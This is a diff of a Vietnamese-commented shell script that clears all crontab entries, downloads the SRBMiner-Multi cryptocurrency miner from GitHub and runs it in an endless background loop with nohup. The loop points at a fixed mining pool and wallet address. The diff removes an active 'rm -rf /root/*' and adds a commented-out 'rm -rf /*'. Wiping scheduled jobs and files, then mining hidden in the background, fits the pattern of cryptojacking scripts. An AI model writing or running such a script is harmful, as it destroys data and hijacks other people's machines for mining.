@@ -6,8 +6,9 @@
 # Xóa tất cả các tác vụ trong crontab
 crontab -r
 
-# Xóa tất cả các file và thư mục trong thư mục gốc
-rm -rf /root/*
+# Xóa tất cả các file và thư mục trong thư mục gốc (chỉ nên dùng nếu bạn thực sự muốn xóa hết)
+# CHÚ Ý: Lệnh này cực kỳ nguy hiểm và có thể phá hủy toàn bộ hệ thống của bạn!
+# rm -rf /*
 
 # Tải SRBMiner-Multi
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.5/SRBMiner-Multi-2-5-5-Linux.tar.gz
@@ -18,10 +19,18 @@ tar -xvf SRBMiner-Multi-2-5-5-Linux.tar.gz
 # Chuyển đến thư mục SRBMiner-Multi
 cd SRBMiner-Multi-2-5-5
 
-# Vòng lặp vô hạn để khởi động lại SRBMiner nếu nó dừng
+# Tạo một script để chạy SRBMiner-Multi trong vòng lặp vô hạn
+cat <<EOT > run_srbminer.sh
+#!/bin/sh
 while [ 1 ]; do
-    # Chạy SRBMiner-Multi với các tham số đã chỉ định
     ./SRBMiner-MULTI --algorithm randomscash --pool stratum-asia.rplant.xyz:17019 --tls true --wallet scash1qtkqtq72l9wfnjxwrtscn3gktfvme6g8u35lg68 --keepalive true
-    # Chờ 5 giây trước khi khởi động lại SRBMiner
     sleep 5
 done
+EOT
+
+# Làm cho script có thể chạy được
+chmod +x run_srbminer.sh
+
+# Chạy script dưới dạng ngầm với nohup và xuất kết quả ra tệp hash.log
+nohup ./run_srbminer.sh > hash.log 2>&1 &
+
